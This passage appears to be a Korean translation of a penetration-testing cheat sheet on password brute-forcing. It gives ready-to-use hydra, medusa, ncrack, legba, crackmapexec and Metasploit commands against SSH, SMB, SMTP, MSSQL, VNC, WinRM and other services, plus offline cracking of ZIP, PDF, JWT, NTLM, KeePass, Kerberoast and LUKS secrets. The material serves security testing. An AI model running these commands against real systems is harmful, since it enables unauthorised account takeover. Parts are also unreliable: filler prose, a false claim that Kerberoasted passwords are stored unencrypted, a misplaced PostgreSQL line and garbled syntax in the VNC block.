SMB 브루트 포스 공격을 방지하기 위해 강력한 암호를 사용하고, 계정 잠금 정책을 설정하는 것이 좋습니다. 또한, 네트워크 보안을 강화하고, 방화벽을 설정하여 외부에서의 액세스를 제한하는 것이 중요합니다.
```bash
nmap --script smb-brute -p 445 <IP>
hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
legba smb --target share.company.com --username admin --password data/passwords.txt [--smb-workgroup <SMB_WORKGROUP>] [--smb-share <SMB_SHARE>]
```
### SMTP

SMTP (Simple Mail Transfer Protocol)은 전자 메일을 보내는 데 사용되는 표준 프로토콜입니다. SMTP 서버는 전자 메일을 수신 서버로 전송하는 역할을 합니다. SMTP는 TCP/IP 프로토콜 스택을 기반으로 하며, 25번 포트를 사용하여 통신합니다.

SMTP 브루트 포스 공격은 SMTP 서버에 대한 인증 정보를 추측하여 액세스를 시도하는 공격입니다. 이 공격은 일반적으로 사전 공격을 사용하여 가능한 모든 조합을 시도합니다. 브루트 포스 공격은 약한 암호를 사용하는 사용자 계정을 찾는 데 유용합니다.

SMTP 브루트 포스 공격을 수행하기 위해 다음 단계를 따릅니다:

1. 대상 SMTP 서버의 IP 주소 또는 도메인을 식별합니다.
2. SMTP 브루트 포스 도구를 사용하여 대상 서버에 대한 브루트 포스 공격을 실행합니다.
3. 도구는 가능한 모든 조합을 시도하여 올바른 인증 정보를 찾습니다.
4. 올바른 인증 정보를 찾으면 액세스를 얻을 수 있습니다.

SMTP 브루트 포스 공격은 인증 정보를 추측하는 데 시간이 오래 걸릴 수 있으며, 대상 서버에서 이러한 공격을 방지하기 위해 일정한 제한 사항이 설정되어 있을 수 있습니다. 따라서 이러한 공격을 수행할 때는 주의가 필요합니다.
```bash
hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V
hydra -l <username> -P /path/to/passwords.txt -s 587 <IP> -S -v -V #Port 587 for SMTP with SSL
legba smtp --username admin@example.com --password wordlists/passwords.txt --target localhost:25 [--smtp-mechanism <mech>]
```
### SOCKS

SOCKS는 네트워크 프로토콜로, 프록시 서버를 통해 트래픽을 라우팅하는 데 사용됩니다. SOCKS는 TCP와 UDP 트래픽을 모두 지원하며, 인증 및 암호화 기능도 제공합니다. SOCKS는 일반적으로 익명성을 유지하고 방화벽을 우회하기 위해 사용됩니다.

SOCKS 프록시 서버를 사용하여 브루트 포스 공격을 수행할 수 있습니다. 브루트 포스 공격은 모든 가능한 조합을 시도하여 암호를 찾는 공격입니다. SOCKS 프록시 서버를 통해 브루트 포스 공격을 수행하면 공격자의 IP 주소를 숨길 수 있으며, 대상 시스템에 대한 액세스를 얻을 수 있습니다.

브루트 포스 공격을 수행하기 전에 대상 시스템에 대한 정보를 수집하는 것이 중요합니다. 이를 위해 포트 스캐닝, 서비스 식별 및 사용자 계정 확인 등의 기술을 사용할 수 있습니다. 또한, 암호 정책, 사용자 이름 및 암호의 패턴 등을 분석하여 가능한 암호를 예측할 수 있습니다.

브루트 포스 공격을 수행할 때는 다양한 도구와 기술을 사용할 수 있습니다. 일반적으로는 Hydra, Medusa, Ncrack 등의 브루트 포스 도구를 사용하며, 사전 공격, 마스크 공격, 규칙 기반 공격 등의 기술을 적용할 수 있습니다.

브루트 포스 공격은 시간이 많이 소요되고, 대상 시스템에 부하를 줄 수 있으므로 주의해야 합니다. 또한, 암호화된 트래픽을 사용하는 경우에는 브루트 포스 공격이 더 어려울 수 있습니다. 따라서, 브루트 포스 공격을 수행하기 전에 대상 시스템의 취약점을 분석하고, 다른 공격 기법을 고려하는 것이 좋습니다.
```bash
nmap  -vvv -sCV --script socks-brute --script-args userdb=users.txt,passdb=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt,unpwndb.timelimit=30m -p 1080 <IP>
legba socks5 --target localhost:1080 --username admin --password data/passwords.txt
# With alternative address
legba socks5 --target localhost:1080 --username admin --password data/passwords.txt --socks5-address 'internal.company.com' --socks5-port 8080
```
# SQL Server

SQL Server는 Microsoft에서 개발한 관계형 데이터베이스 관리 시스템(RDBMS)입니다. SQL Server는 Windows 운영 체제에서 실행되며, 데이터베이스 관리, 데이터 저장 및 검색, 데이터 분석 등 다양한 기능을 제공합니다.

## 브루트 포스 공격

브루트 포스 공격은 시스템에 대한 암호를 찾기 위해 가능한 모든 조합을 시도하는 공격입니다. SQL Server에 대한 브루트 포스 공격은 다음과 같은 단계로 진행됩니다.

1. 사용자 이름 식별: 브루트 포스 공격을 시작하기 전에, 시스템에 대한 유효한 사용자 이름을 식별해야 합니다. 이를 위해 일반적으로 사용되는 사용자 이름 목록을 사용하거나, 사용자 이름을 추측하는 기술을 사용할 수 있습니다.

2. 암호 식별: 유효한 사용자 이름을 식별한 후, 가능한 모든 암호 조합을 시도하여 올바른 암호를 찾습니다. 이를 위해 일반적으로 사용되는 암호 목록을 사용하거나, 암호를 추측하는 기술을 사용할 수 있습니다.

3. 브루트 포스 도구 사용: 브루트 포스 공격을 자동화하기 위해 다양한 브루트 포스 도구를 사용할 수 있습니다. 이러한 도구는 대부분 다양한 암호 조합을 시도하고, 암호를 찾을 때까지 계속 시도합니다.

4. 성공적인 암호 찾기: 브루트 포스 공격이 성공하면, 공격자는 시스템에 로그인할 수 있는 유효한 사용자 이름과 암호를 얻게 됩니다. 이를 통해 공격자는 시스템에 대한 권한을 획득하고, 민감한 데이터에 접근할 수 있게 됩니다.

## 방어 대책

SQL Server에서 브루트 포스 공격을 방지하기 위해 다음과 같은 방어 대책을 적용할 수 있습니다.

- 강력한 암호 정책: 사용자들에게 강력한 암호를 사용하도록 요구하는 암호 정책을 설정합니다. 이는 암호의 길이, 복잡성, 만료 기간 등을 포함할 수 있습니다.

- 계정 잠금: 일정 횟수의 실패한 로그인 시도 후에 계정을 잠그는 기능을 활성화합니다. 이를 통해 브루트 포스 공격을 어렵게 만들 수 있습니다.

- IP 주소 제한: 특정 IP 주소에서만 SQL Server에 접근할 수 있도록 설정합니다. 이를 통해 외부에서의 브루트 포스 공격을 방지할 수 있습니다.

- 로그 모니터링: 로그인 시도 및 계정 잠금과 관련된 로그를 모니터링하여 브루트 포스 공격을 탐지할 수 있습니다. 이를 통해 적절한 대응 조치를 취할 수 있습니다.

- 업데이트 및 패치: SQL Server를 최신 버전으로 업데이트하고, 보안 패치를 적용하여 알려진 취약점을 해결합니다. 이를 통해 브루트 포스 공격에 대한 취약성을 줄일 수 있습니다.

- 다중 요인 인증: 다중 요인 인증을 사용하여 로그인 프로세스를 보호합니다. 이는 사용자가 추가적인 인증 단계를 거치도록 요구하여 보안을 강화합니다.

## 결론

SQL Server에서 브루트 포스 공격은 암호를 찾기 위한 공격 기법 중 하나입니다. 이를 방지하기 위해 강력한 암호 정책, 계정 잠금, IP 주소 제한, 로그 모니터링, 업데이트 및 패치, 다중 요인 인증 등의 방어 대책을 적용해야 합니다.
```bash
#Use the NetBIOS name of the machine as domain
crackmapexec mssql <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> mssql
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M mssql
nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=customuser.txt,passdb=custompass.txt,ms-sql-brute.brute-windows-accounts <host> #Use domain if needed. Be careful with the number of passwords in the list, this could block accounts
msf> use auxiliary/scanner/mssql/mssql_login #Be careful, you can block accounts. If you have a domain set it and use USE_WINDOWS_ATHENT
```
### SSH

SSH (Secure Shell)는 네트워크 프로토콜로, 원격 시스템에 안전하게 접속하기 위해 사용됩니다. SSH는 암호화된 통신을 제공하여 데이터의 기밀성과 무결성을 보장합니다. SSH는 일반적으로 리눅스 및 유닉스 시스템에서 원격으로 접속하기 위해 사용되며, 비밀번호 또는 공개키 인증을 통해 인증을 수행합니다.

SSH 브루트 포스 공격은 SSH 서버에 대한 암호를 추측하여 접속을 시도하는 공격입니다. 이 공격은 대상 시스템에 대한 암호를 알아내기 위해 다양한 암호 조합을 시도합니다. SSH 브루트 포스 공격은 비밀번호를 사용하는 SSH 인증 방식에서 특히 효과적입니다.

SSH 브루트 포스 공격을 수행하기 위해 다양한 도구와 기술이 사용될 수 있습니다. 일반적으로는 사전 공격, 무차별 대입 공격, 사전 공격과 무차별 대입 공격의 조합 등이 사용됩니다. 이러한 공격은 대상 시스템의 암호 정책, 사용자 계정의 약점, 사전에 미리 수집한 정보 등을 기반으로 수행됩니다.

SSH 브루트 포스 공격을 방지하기 위해 다양한 조치를 취할 수 있습니다. 강력한 암호 정책을 설정하고, 계정 잠금 정책을 적용하며, IP 주소 기반의 접근 제어를 구성하는 등의 방법이 있습니다. 또한, 공격자의 IP 주소를 차단하는 등의 대응 조치를 취할 수도 있습니다.

SSH 브루트 포스 공격은 시스템 보안에 매우 위협적인 공격입니다. 따라서, SSH 서버를 운영하는 경우에는 적절한 보안 조치를 취하여 이러한 공격으로부터 시스템을 보호해야 합니다.
```bash
hydra -l root -P passwords.txt [-t 32] <IP> ssh
ncrack -p 22 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ssh
patator ssh_login host=<ip> port=22 user=root 0=/path/passwords.txt password=FILE0 -x ignore:mesg='Authentication failed'
legba ssh --username admin --password wordlists/passwords.txt --target localhost:22
# Try keys from a folder
legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
```
#### 약한 SSH 키 / Debian 예측 가능한 PRNG

일부 시스템은 암호화 자료를 생성하는 데 사용되는 난수 시드에 알려진 결함이 있습니다. 이로 인해 대폭 축소된 키스페이스가 발생할 수 있으며, [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute)와 같은 도구를 사용하여 무차별 대입 공격(bruteforce)을 할 수 있습니다. 또한 [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)와 같이 약한 키의 사전 생성된 세트도 사용할 수 있습니다.

### STOMP (ActiveMQ, RabbitMQ, HornetQ 및 OpenMQ)

STOMP 텍스트 프로토콜은 RabbitMQ, ActiveMQ, HornetQ 및 OpenMQ와 같은 인기있는 메시지 큐 서비스와의 원활한 통신과 상호 작용을 가능하게 하는 널리 사용되는 메시징 프로토콜입니다. 이는 메시지 교환 및 다양한 메시징 작업을 표준화되고 효율적인 방식으로 수행할 수 있도록 제공합니다.
```bash
legba stomp --target localhost:61613 --username admin --password data/passwords.txt
```
### Telnet

Telnet은 원격 컴퓨터에 접속하기 위한 네트워크 프로토콜입니다. Telnet을 사용하면 클라이언트 컴퓨터에서 호스트 컴퓨터로 텍스트 기반의 터미널 세션을 열 수 있습니다. 이를 통해 원격으로 명령어를 실행하고 파일을 전송할 수 있습니다.

Telnet은 기본적으로 암호화되지 않은 통신을 사용하기 때문에 보안에 취약합니다. 따라서, Telnet을 사용하여 접속할 때는 중요한 정보를 전송하지 않는 것이 좋습니다. 대신, SSH와 같은 보안 프로토콜을 사용하는 것이 안전합니다.

Telnet을 사용하여 무차별 대입(brute force) 공격을 시도할 수도 있습니다. 이는 다양한 사용자 이름과 비밀번호 조합을 시도하여 로그인에 성공하는 조합을 찾는 과정입니다. 이러한 공격은 약한 인증 정보를 사용하는 시스템에서 효과적일 수 있습니다.

Telnet을 사용하여 무차별 대입 공격을 시도할 때는 효율적인 방법을 사용해야 합니다. 예를 들어, 대상 시스템에서 계정 잠금 정책이 적용되어 있을 수 있으므로, 일정 시간 동안 잠금이 걸리는 경우를 고려해야 합니다. 또한, 대입 공격을 자동화하기 위해 스크립트나 도구를 사용할 수도 있습니다.

Telnet을 통해 무차별 대입 공격을 시도할 때는 합법적인 권한을 가진 시스템에 대해서만 시도해야 합니다. 무차별 대입 공격은 불법적인 행위로 간주될 수 있으며, 법적인 문제를 일으킬 수 있습니다. 따라서, 합법적인 테스트나 보안 평가를 위한 목적으로만 사용해야 합니다.
```bash
hydra -l root -P passwords.txt [-t 32] <IP> telnet
ncrack -p 23 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M telnet

legba telnet \
--username admin \
--password wordlists/passwords.txt \
--target localhost:23 \
--telnet-user-prompt "login: " \
--telnet-pass-prompt "Password: " \
--telnet-prompt ":~$ " \
--single-match # this option will stop the program when the first valid pair of credentials will be found, can be used with any plugin
```
### VNC

VNC (Virtual Network Computing)는 원격 컴퓨터에 액세스하기 위한 그래픽 데스크톱 공유 시스템입니다. VNC는 클라이언트-서버 모델을 사용하여 원격 컴퓨터의 화면을 보여주고 제어할 수 있습니다. VNC는 TCP/IP 프로토콜을 사용하며, 클라이언트는 원격 컴퓨터에 연결하여 그래픽 화면을 수신하고 입력을 전송합니다.

VNC 브루트 포스 공격은 알려진 사용자 이름과 비밀번호 목록을 사용하여 VNC 서버에 대한 인증을 강제로 시도하는 공격입니다. 이 공격은 약한 인증 정보를 사용하는 VNC 서버를 대상으로 하며, 성공적으로 인증을 획득하면 원격 컴퓨터를 제어할 수 있습니다.

VNC 브루트 포스 공격을 수행하기 위해서는 다음과 같은 단계를 따릅니다:

1. 사용자 이름과 비밀번호 목록 준비: VNC 서버에 대한 인증을 시도할 사용자 이름과 비밀번호 목록을 준비합니다. 이 목록은 일반적으로 알려진 기본 사용자 이름과 일반적인 비밀번호를 포함합니다.

2. 브루트 포스 도구 사용: 브루트 포스 도구를 사용하여 VNC 서버에 대한 인증을 시도합니다. 이 도구는 사용자 이름과 비밀번호 목록을 순차적으로 시도하며, 올바른 인증 정보를 찾을 때까지 계속 시도합니다.

3. 성공적인 인증: 올바른 사용자 이름과 비밀번호를 찾으면 VNC 서버에 대한 인증이 성공적으로 수행됩니다. 이후에는 원격 컴퓨터를 제어할 수 있습니다.

VNC 브루트 포스 공격은 약한 인증 정보를 사용하는 VNC 서버에 대해 효과적일 수 있지만, 강력한 인증 정보를 사용하는 경우에는 성공할 가능성이 낮습니다. 따라서, VNC 서버를 보호하기 위해서는 강력한 비밀번호를 사용하고, 인증 시도 횟수를 제한하는 등의 보안 조치를 취해야 합니다.
```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt -s <PORT> <IP> vnc
medusa -h <IP> –u root -P /root/Desktop/pass.txt –M vnc
ncrack -V --user root -P /root/Desktop/pass.txt <IP>:>POR>T
patator vnc_login host=<IP> password=FILE0 0=/root/Desktop/pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0
use auxiliary/scanner/vnc/vnc_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
legba vnc --target localhost:5901 --password data/passwords.txt

#Metasploit
use auxiliary/scanner/vnc/vnc_login
set RHOSTS <ip>
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.lst
```
### Winrm

Winrm은 Windows 원격 관리 서비스로, 원격 시스템에 대한 액세스를 제공합니다. Winrm은 HTTP 또는 HTTPS를 통해 통신하며, PowerShell을 사용하여 원격 시스템에 명령을 실행하고 데이터를 검색할 수 있습니다.

Winrm을 사용하여 무차별 대입(brute force) 공격을 수행할 수 있습니다. 이는 다양한 사용자 이름과 비밀번호 조합을 시도하여 올바른 자격 증명을 찾는 과정입니다. 무차별 대입 공격은 약한 자격 증명을 사용하는 시스템에서 특히 효과적입니다.

무차별 대입 공격을 수행하기 위해 다음 단계를 따릅니다:

1. 사용자 이름 목록 생성: 대상 시스템의 사용자 이름을 수집하거나, 일반적으로 사용되는 사용자 이름 목록을 사용합니다.
2. 비밀번호 목록 생성: 일반적인 비밀번호 목록을 사용하거나, 사전 공격을 위해 특정 컨텍스트에 맞는 비밀번호 목록을 생성합니다.
3. Winrm을 사용하여 대입 공격 실행: 생성한 사용자 이름과 비밀번호 목록을 사용하여 Winrm을 통해 원격 시스템에 대입 공격을 실행합니다.
4. 성공적인 인증 확인: 올바른 자격 증명으로 인증에 성공한 경우, 원격 시스템에 대한 액세스 권한을 얻을 수 있습니다.

무차별 대입 공격은 시스템 보안을 향상시키기 위해 다음과 같은 방법으로 방지할 수 있습니다:

- 강력한 암호 정책 적용: 사용자들이 강력한 비밀번호를 사용하도록 요구합니다.
- 계정 잠금 정책 설정: 일정 횟수의 실패한 로그인 시도 후 계정을 잠급니다.
- IP 차단: 일정 횟수의 실패한 로그인 시도 후 해당 IP 주소를 차단합니다.
- 다단계 인증(MFA) 사용: 추가적인 인증 요소를 사용하여 보안을 강화합니다.

무차별 대입 공격은 윤리적인 한계를 준수하며, 합법적인 펜테스팅 활동의 일부로 수행되어야 합니다.
```bash
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
```
<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)을 사용하여 세계에서 가장 **고급** 커뮤니티 도구로 구동되는 **워크플로우**를 쉽게 구축하고 자동화하세요.\
오늘 바로 액세스하세요:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## 로컬

### 온라인 해독 데이터베이스

* [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 및 SHA1)
* [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 with/without ESS/SSP 및 임의의 도전 값)
* [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (해시, WPA2 캡처 및 아카이브 MSOffice, ZIP, PDF...)
* [https://crackstation.net/](https://crackstation.net) (해시)
* [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
* [https://gpuhash.me/](https://gpuhash.me) (해시 및 파일 해시)
* [https://hashes.org/search.php](https://hashes.org/search.php) (해시)
* [https://www.cmd5.org/](https://www.cmd5.org) (해시)
* [https://hashkiller.co.uk/Cracker](https://hashkiller.co.uk/Cracker) (MD5, NTLM, SHA1, MySQL5, SHA256, SHA512)
* [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) (MD5)
* [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)

해시를 무차별 대입하기 전에 이 사이트를 확인하세요.

### ZIP
```bash
#sudo apt-get install fcrackzip
fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' chall.zip
```

```bash
zip2john file.zip > zip.john
john zip.john
```

```bash
#$zip2$*0*3*0*a56cb83812be3981ce2a83c581e4bc4f*4d7b*24*9af41ff662c29dfff13229eefad9a9043df07f2550b9ad7dfc7601f1a9e789b5ca402468*694b6ebb6067308bedcd*$/zip2$
hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
.\hashcat.exe -m 13600 -i -a 0 .\hashzip.txt #Incremental attack
```
#### 알려진 평문 zip 공격

암호화된 zip 파일 내부에 있는 파일의 **평문** (또는 일부 평문)을 알아야 합니다. 암호화된 zip 파일 내부에 있는 **파일 이름과 파일 크기를 확인**하려면 **`7z l encrypted.zip`**를 실행하세요. [**bkcrack** ](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0)을 릴리스 페이지에서 다운로드하세요.
```bash
# You need to create a zip file containing only the file that is inside the encrypted zip
zip plaintext.zip plaintext.file

./bkcrack -C <encrypted.zip> -c <plaintext.file> -P <plaintext.zip> -p <plaintext.file>
# Now wait, this should print a key such as 7b549874 ebc25ec5 7e465e18
# With that key you can create a new zip file with the content of encrypted.zip
# but with a different pass that you set (so you can decrypt it)
./bkcrack -C <encrypted.zip> -k 7b549874 ebc25ec5 7e465e18 -U unlocked.zip new_pwd
unzip unlocked.zip #User new_pwd as password
```
### 7z

7z는 압축 파일 형식이며, 7-Zip 소프트웨어로 압축 및 압축 해제할 수 있습니다. 7z 파일은 일반적으로 .7z 확장자를 가지며, 다른 압축 형식보다 더 효율적인 압축 알고리즘을 사용합니다.

7z 파일을 브루트 포스 공격으로 해독하려면, 가능한 모든 암호 조합을 시도하여 올바른 암호를 찾아야 합니다. 이를 위해 브루트 포스 공격 도구를 사용할 수 있습니다. 일반적으로, 브루트 포스 공격은 시간이 오래 걸리고, 성공 확률이 낮을 수 있으므로, 효율적인 암호 조합을 찾기 위해 사전 공격을 시도하는 것이 좋습니다.

7z 파일을 브루트 포스 공격으로 해독하는 방법은 다음과 같습니다:

1. 브루트 포스 공격 도구를 설치하고 설정합니다.
2. 암호 조합을 생성하는 사전을 작성합니다.
3. 브루트 포스 공격 도구를 사용하여 7z 파일을 해독합니다.
4. 올바른 암호를 찾을 때까지 암호 조합을 시도합니다.

브루트 포스 공격은 시간이 오래 걸릴 수 있으므로, 가능한 암호 조합을 줄이기 위해 암호의 길이를 제한하거나 특정 문자 집합을 사용할 수도 있습니다. 또한, 병렬 처리를 사용하여 브루트 포스 공격을 가속화할 수도 있습니다.

7z 파일을 브루트 포스 공격으로 해독하는 것은 불법적인 목적으로 사용되지 않도록 주의해야 합니다. 합법적인 목적으로 사용되는 경우에도, 암호를 찾는 데 시간이 오래 걸릴 수 있으므로, 다른 해독 방법을 고려하는 것이 좋습니다.
```bash
cat /usr/share/wordlists/rockyou.txt | 7za t backup.7z
```

```bash
#Download and install requirements for 7z2john
wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/7z2john.pl
apt-get install libcompress-raw-lzma-perl
./7z2john.pl file.7z > 7zhash.john
```
### PDF

PDF는 Portable Document Format의 약자로, 다양한 운영 체제와 장치에서 동일한 형식으로 문서를 표시하는 데 사용되는 파일 형식입니다. PDF 파일은 텍스트, 이미지, 그래픽 및 다른 요소를 포함할 수 있으며, 다른 소프트웨어나 하드웨어 플랫폼에서도 일관된 방식으로 표시됩니다.

PDF 파일은 종종 문서의 보안을 위해 사용되며, 암호화, 디지털 서명 및 접근 제어와 같은 기능을 제공합니다. PDF 파일은 또한 인쇄, 복사, 편집 등의 작업을 제한할 수 있습니다.

PDF 파일을 해킹하는 기술 중 하나는 브루트 포스 공격입니다. 이 공격은 암호화된 PDF 파일의 암호를 찾기 위해 모든 가능한 조합을 시도하는 것입니다. 브루트 포스 공격은 시간이 오래 걸릴 수 있지만, 암호가 약하게 설정되어 있다면 성공할 수 있습니다.

PDF 파일을 브루트 포스 공격으로 해킹하는 방법은 다음과 같습니다:

1. 암호화된 PDF 파일을 대상으로 선택합니다.
2. 가능한 모든 암호 조합을 생성합니다.
3. 생성된 암호 조합을 사용하여 PDF 파일을 열어보고, 올바른 암호를 찾을 때까지 반복합니다.
4. 올바른 암호를 찾으면 암호를 사용하여 PDF 파일을 열 수 있습니다.

PDF 파일을 브루트 포스 공격으로 해킹하는 것은 시간과 노력이 많이 드는 작업일 수 있으며, 또한 불법적인 목적으로 사용될 수 있습니다. 따라서 합법적인 목적으로만 사용해야 하며, 암호를 설정할 때 강력한 암호를 사용하는 것이 중요합니다.
```bash
apt-get install pdfcrack
pdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt
#pdf2john didn't work well, john didn't know which hash type was
# To permanently decrypt the pdf
sudo apt-get install qpdf
qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
```
### PDF 소유자 비밀번호

PDF 소유자 비밀번호를 해독하려면 다음을 확인하십시오: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)

### JWT
```bash
git clone https://github.com/Sjord/jwtcrack.git
cd jwtcrack

#Bruteforce using crackjwt.py
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#Bruteforce using john
python jwt2john.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc > jwt.john
john jwt.john #It does not work with Kali-John
```
### NTLM 크래킹

NTLM 크래킹은 암호 해독 기술 중 하나로, Windows 운영 체제에서 사용되는 NTLM 해시를 깨는 과정을 말합니다. NTLM은 Windows 인증 프로토콜로 사용되며, 해시 함수를 통해 사용자의 암호를 저장합니다. 이러한 해시를 얻으면 크래킹 도구를 사용하여 원래 암호를 복구할 수 있습니다.

NTLM 크래킹을 수행하기 위해 다양한 도구와 기술이 사용됩니다. 일반적으로 사전 공격, 레인보우 테이블, 그리고 브루트 포스 공격이 가장 일반적으로 사용되는 기법입니다.

- 사전 공격: 미리 생성된 암호 목록을 사용하여 NTLM 해시를 비교하는 공격입니다. 일반적으로 일반적인 암호 및 패스워드 조합을 포함한 사전 파일을 사용합니다.

- 레인보우 테이블: 미리 계산된 해시 체인을 사용하여 NTLM 해시를 비교하는 공격입니다. 이러한 해시 체인은 일반적으로 암호화된 암호를 해독하는 데 사용됩니다.

- 브루트 포스 공격: 가능한 모든 조합을 시도하여 NTLM 해시를 비교하는 공격입니다. 이 방법은 시간이 오래 걸리지만, 암호가 강력하지 않은 경우에 효과적일 수 있습니다.

NTLM 크래킹은 암호 분석 및 해독에 대한 기본적인 이해와 함께 사용되어야 합니다. 또한, 합법적인 테스트나 보안 감사 목적으로만 사용되어야 합니다.
```bash
Format:USUARIO:ID:HASH_LM:HASH_NT:::
john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT file_NTLM.hashes
hashcat -a 0 -m 1000 --username file_NTLM.hashes /usr/share/wordlists/rockyou.txt --potfile-path salida_NT.pot
```
# Keepass

Keepass는 비밀번호 관리자로, 사용자의 다양한 온라인 계정에 대한 비밀번호를 안전하게 저장하고 관리하는 데 사용됩니다. Keepass는 강력한 암호화 기술을 사용하여 비밀번호 데이터베이스를 보호합니다. 이 도구를 사용하면 사용자는 각 계정에 대한 고유한, 복잡한 비밀번호를 생성하고 저장할 수 있습니다.

Keepass는 다양한 플랫폼에서 사용할 수 있으며, 사용자는 모바일 기기나 컴퓨터에서 동기화하여 비밀번호에 쉽게 액세스할 수 있습니다. 또한 Keepass는 다양한 보안 기능을 제공하여 사용자의 비밀번호를 보호합니다. 예를 들어, 사용자는 키 파일, 마스터 비밀번호, 또는 키 파일과 마스터 비밀번호의 조합을 사용하여 데이터베이스에 액세스할 수 있습니다.

Keepass는 브루트 포스 공격에 대한 보호 기능도 제공합니다. 브루트 포스 공격은 모든 가능한 비밀번호 조합을 시도하여 암호를 찾는 공격입니다. Keepass는 일정한 시간 지연을 도입하여 잘못된 비밀번호 시도를 제한하고, 일정 횟수의 잘못된 시도 후에는 잠금 상태로 전환하여 브루트 포스 공격을 방지합니다.

Keepass를 사용하여 비밀번호를 안전하게 관리하고 보호하는 것은 온라인 보안을 강화하는 중요한 단계입니다. 사용자는 강력한 비밀번호를 사용하고, 주기적으로 비밀번호를 변경하며, Keepass 데이터베이스를 안전한 장소에 보관하는 것을 권장합니다.
```bash
sudo apt-get install -y kpcli #Install keepass tools like keepass2john
keepass2john file.kdbx > hash #The keepass is only using password
keepass2john -k <file-password> file.kdbx > hash # The keepass is also using a file as a needed credential
#The keepass can use a password and/or a file as credentials, if it is using both you need to provide them to keepass2john
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```
### Keberoasting

Keberoasting은 암호화되지 않은 서비스 계정의 암호를 추측하기 위해 사용되는 공격 기법입니다. 이 기법은 주로 Windows Active Directory 환경에서 사용되며, 서비스 계정의 암호를 추출하여 오프라인으로 공격자가 더 강력한 컴퓨팅 자원을 사용하여 암호를 크래킹할 수 있도록 합니다.

Keberoasting은 주로 Kerberos 프로토콜을 사용하는 서비스 계정에 대해 수행됩니다. 공격자는 Kerberos 서비스 티켓을 요청하고, 이 티켓을 사용하여 서비스 계정의 암호를 추출합니다. 이 암호는 일반적으로 암호화되지 않은 상태로 저장되어 있으며, 공격자는 이를 오프라인으로 크래킹하여 원래 암호를 추측할 수 있습니다.

Keberoasting은 주로 다음과 같은 단계로 수행됩니다:

1. 도메인 내에서 서비스 계정 식별
2. 서비스 계정의 Kerberos 서비스 티켓 요청
3. 티켓을 사용하여 암호 추출
4. 추출된 암호를 크래킹하여 원래 암호 추측

Keberoasting은 암호화되지 않은 서비스 계정의 암호를 추측하는 강력한 기법으로, 암호 정책이 강화되지 않은 환경에서 특히 취약합니다. 따라서, 보안을 강화하기 위해 암호 정책을 강화하고, 서비스 계정에 대한 강력한 암호를 사용하는 것이 중요합니다.
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### Lucks 이미지

#### 방법 1

설치: [https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)
```bash
bruteforce-luks -f ./list.txt ./backup.img
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```
#### 방법 2

Brute force is a technique used to crack passwords or encryption by systematically trying all possible combinations until the correct one is found. It is a time-consuming process that requires a lot of computational power. 

In order to perform a brute force attack, you need a list of possible passwords or encryption keys. This list can be generated using various methods such as dictionary attacks, common password lists, or custom wordlists. 

